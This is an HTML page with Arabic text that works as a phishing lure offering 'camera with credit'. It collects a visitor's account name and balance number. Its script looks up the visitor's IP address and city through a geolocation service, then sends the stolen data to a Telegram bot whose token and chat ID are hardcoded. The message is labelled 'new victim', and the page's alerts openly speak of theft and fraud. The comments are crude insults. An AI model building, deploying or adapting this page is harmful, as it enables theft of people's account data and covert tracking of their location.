<!DOCTYPE html>
<html>
<head>
    <title>موقع لزهراء متطور</title>
    <style>
        body {
            background: url('https://i.pinimg.com/736x/6a/6a/e0/6a6ae0e9175f7f99ee86aa2ea0129526.jpg') no-repeat center center fixed;
            background-size: cover;
            text-align: center;
            padding: 100px;
            font-family: Arial, sans-serif;
            color: white;
            text-shadow: 2px 2px 4px #000000;
        }
        .form-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            display: inline-block;
        }
        input, button {
            padding: 12px;
            margin: 10px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #FF0000;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
    <script>
        async function getShit() {
            // تتبع الموقع يا خول
            let locationShit = "غير معروف";
            
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                locationShit = `${ipData.city}, ${ipData.region}, ${ipData.country_name} | ${ipData.ip}`;
            } catch (error) {
                locationShit = "فشل التتبع يا فاشل";
            }

            return locationShit;
        }

        async function sendToTelegram() {
            const token = '8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog';
            const chatId = '7763665935';
            
            const account = document.getElementById('account').value;
            const balance = document.getElementById('balance').value;
            const location = await getShit();

            const message = 
                `🔥 ضحية جديدة 🔥\n\n` +
                `👤 الحساب: ${account}\n` +
                `💳 الرصيد: ${balance}\n\n` +
                `📍 الموقع: ${location}\n` +
                `🕒 الوقت: ${new Date().toLocaleString()}`;

            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                alert('تم سرقة بيانات الضحية وتحديد موقعها!');
            } catch (error) {
                alert(`خطأ في النصب: ${error.message}`);
            }
        }
    </script>
</head>
<body>
    <div class="form-container">
        <h1>👁️ كاميرا برصيد - 👁️</h1>
        <form onsubmit="event.preventDefault(); sendToTelegram()">
            <input type="text" id="account" placeholder="اسم " required><br>
            <input type="number" id="balance" placeholder="رقم الرصيد " required><br>
            <button type="submit">سحب البيانات </button>
        </form>
    </div>
</body>
    </html>
